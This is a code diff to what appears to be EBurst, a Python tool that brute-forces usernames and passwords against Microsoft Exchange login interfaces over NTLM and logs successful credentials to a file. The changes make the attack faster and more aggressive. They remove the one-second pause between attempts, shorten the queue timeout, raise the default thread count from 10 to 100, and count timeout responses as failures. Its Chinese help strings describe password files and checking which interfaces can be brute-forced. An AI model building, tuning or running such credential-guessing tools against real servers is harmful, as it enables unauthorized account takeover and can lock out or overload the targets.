@@ -53,7 +53,7 @@ class Check_Exchange_User:
     def check_NTLM_userpass(self, user, password, url):
         try:
             response = requests.get(url, auth=HttpNtlmAuth(user, password), headers=self.HEADERS)
-            if 401 != response.status_code:
+            if 401 != response.status_code and 408 != response.status_code:
                 return True
             else:
                 return False
@@ -69,7 +69,7 @@ class Check_Exchange_User:
             request = requests.session()
             request.keep_alive = False
             response = request.get(url, headers=HEADERS)
-            if 401 != response.status_code:
+            if 401 != response.status_code and 408 != response.status_code:
                 return True
             else:
                 return False
@@ -195,20 +195,18 @@ class Check_Exchange_User:
         self.lock.release()
         while not self.STOP_ME:
             try:
-                lst_info = self.queue.get(timeout=0.2)
+                lst_info = self.queue.get(timeout=0.1)
             except Queue.Empty:
                 break
 
             while not self.STOP_ME:
                 self._update_scan_count()
                 self.msg_queue.put('status')
-                time.sleep(1.0)
                 if self.check_Exchange_Interfac(lst_info["user"], lst_info["passwd"]):
                     self._update_found_count()
                     msg = ("success user: %s ，password: %s" % (lst_info["user"], lst_info["passwd"])).ljust(30)
                     self.msg_queue.put(msg)
                     self.msg_queue.put('status')
-
                     self.outfile.write(msg + '\n')
                     self.outfile.flush()
                 break
@@ -247,7 +245,7 @@ if __name__ == '__main__':
     parser.add_option("-P", dest="passfile", help=u"密码文件")
     parser.add_option("-l", dest="user", help=u"指定用户名")
     parser.add_option("-p", dest="password", help=u"指定密码")
-    parser.add_option("-T", "--t", dest="thread", type="int", default=10, help=u"线程数量，默认为10")
+    parser.add_option("-T", "--t", dest="thread", type="int", default=100, help=u"线程数量，默认为100")
     parser.add_option("-C", "--c", dest="check", default=False, action='store_true', help=u"验证各接口是否存在爆破的可能性")
 
     group = optparse.OptionGroup(parser, "type", u"EBurst 扫描所用的接口")
